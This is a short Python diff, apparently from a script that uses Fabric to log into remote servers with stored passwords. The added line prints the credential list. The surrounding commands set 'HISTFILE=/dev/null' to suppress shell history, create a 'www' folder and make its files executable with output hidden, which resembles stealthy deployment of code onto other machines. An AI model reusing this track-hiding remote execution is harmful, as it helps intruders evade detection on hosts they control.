@@ -8,6 +8,7 @@ except Exception:
   text='off'
 if text =="off":
   try:
+    print(serverip)
     conn = Connection(host=serverip[0], user=serverip[1], connect_kwargs={"password": serverip[2]})
     conn.run(f'HISTFILE=/dev/null /bin/mkdir -p www', hide=True, warn=True, timeout=5)
     conn.run(f'HISTFILE=/dev/null /bin/chmod +x www/*', hide=True, warn=True, timeout=5)
